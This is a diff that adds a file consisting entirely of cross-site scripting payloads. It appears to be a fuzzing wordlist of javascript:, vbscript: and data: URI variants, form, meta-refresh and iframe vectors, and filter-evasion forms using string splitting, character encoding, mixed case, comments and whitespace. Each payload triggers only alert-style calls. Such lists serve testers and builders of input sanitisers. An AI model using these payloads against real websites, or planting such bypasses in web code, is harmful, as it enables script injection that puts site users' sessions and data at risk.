@@ -1,0 +1,43 @@
+data:text/html,<script>parent['al'+'ert'](0)</script>
+data:text/html;base64,PHNjcmlwdD5wYXJlbnRbJ2FsJysnZXJ0J10oMCk8L3NjcmlwdD4=
+vbscript:MsgBox(0)
+vbscript:Execute("MsgBox(0)")
+web+js:alert(0)
+x-javascript:alert(0)
+js:alert(0)
+bookmark:javascript:alert(0)
+location['href']='javascript:al'+'ert(0)'
+window['locati'+'on']='javascri'+'pt:alert(0)'
+self['locat'+'ion']='javasc'+'ript:alert(0)'
+open('java'+'script:al'+'ert(0)')
+window.open('javascr'+'ipt:alert(0)')
+<form action="javascript:alert(0)" id="f"><input type="submit">
+<form action="jav&#x61;script:alert(0)"><button>click</button>
+<meta http-equiv="refresh" content="0;url=javascript:alert(0)">
+<iframe src="javascript:parent.alert(0)">
+<iframe src="jav&#x61;script:alert(0)">
+javascript:\u0061\u006c\u0065\u0072\u0074(0)
+javascript:\x61\x6c\x65\x72\x74(0)
+jav&#x61;script:alert(0)
+java+script:alert(0)
+javascr+ipt:alert(0)
+java/*comment*/script:alert(0)
+javascri<!--comment-->pt:alert(0)
+javascript:prompt(0)
+javascript:confirm(0)
+javascript:print(0)
+javascript:Function('al'+'ert(0)')()
+javascript:setTimeout('alert(0)',0)
+javascript:top['al'+'ert'](0)
+javascript:self['al'+'ert'](0)
+javascript:window['al'+'ert'](0)
+Javascript:alert(0)
+javaSCRIPT:alert(0)
+JaVaScRiPt:alert(0)
+javascript    :    alert(0)
+javascript://%0Aalert(0)
+javascript://%0Dalert(0)
+javascript:%09alert(0)
+javascript:%0Aalert(0)
+javascript:%0Dalert(0)
+%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%30%29
